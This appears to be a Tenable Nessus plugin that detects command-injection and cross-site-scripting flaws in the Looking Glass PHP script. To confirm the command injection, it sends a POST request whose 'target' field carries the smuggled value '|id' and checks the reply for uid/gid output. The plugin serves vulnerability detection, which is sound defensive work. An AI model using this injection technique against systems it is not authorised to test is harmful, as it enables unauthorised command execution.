#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple issues. 

Description :

The remote host appears to be running Jurriaan de Neef's Looking Glass
script, which provides a web interface to various network utilities
such as ping, traceroute, and whois. 

The installed version of Looking Glass suffers from a flaw that allows
an attacker, by manipulating input to the 'target' parameter of the
'lp.php' script, to execute commands on the remote host subject to the
permissions of the web server user id.  In addition, it also is prone
to cross-site scripting attacks due to its failure to sanitize
user-supplied input to the 'version' parameter of the 'header.php' and
'footer.php' scripts. 

See also : 

http://retrogod.altervista.org/lookingglass.html
http://archives.neohapsis.com/archives/bugtraq/2005-08/0381.html

Solution : 

Unknown at this time.

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(19523);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2005-2776", "CVE-2005-2777");
  script_bugtraq_id(14680, 14682);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"19051");
    script_xref(name:"OSVDB", value:"19052");
    script_xref(name:"OSVDB", value:"19053");
  }

  name["english"] = "Looking Glass Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  script_description(english:desc);
 
  summary["english"] = "Checks for multiple vulnerabilities in Looking Glass";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Make sure the affected script exists.
  req = http_get(item:string(dir, "/lg.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it looks like the affected script...
  if (
    '<option value="dnsa">' >< res && 
    '<input type="text" name="target"' >< res
  ) {
    # Try to exploit the flaw to run a command.
    postdata = string(
      "func=dnsa&",
      "ipv=ipv4&",
      # nb: run 'id'.
      "target=|id"
    );
    req = string(
      "POST ", dir, "/lg.php HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    pat = "^uid=[0-9]+.*gid=[0-9]+.*$";
    matches = egrep(string:res, pattern:pat);
    if (matches) {
      foreach match (split(matches)) {
        output = match;
        break;
      }
    }
    if (output) {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Nessus was able to execute the command 'id' on the remote host.\n",
        "\n",
        "  Request:  POST ", dir, "/lg.php\n",
        "  Output:   ", output, "\n"
      );
      security_hole(port:port, data:report);
      exit(0);
    }
  }
}
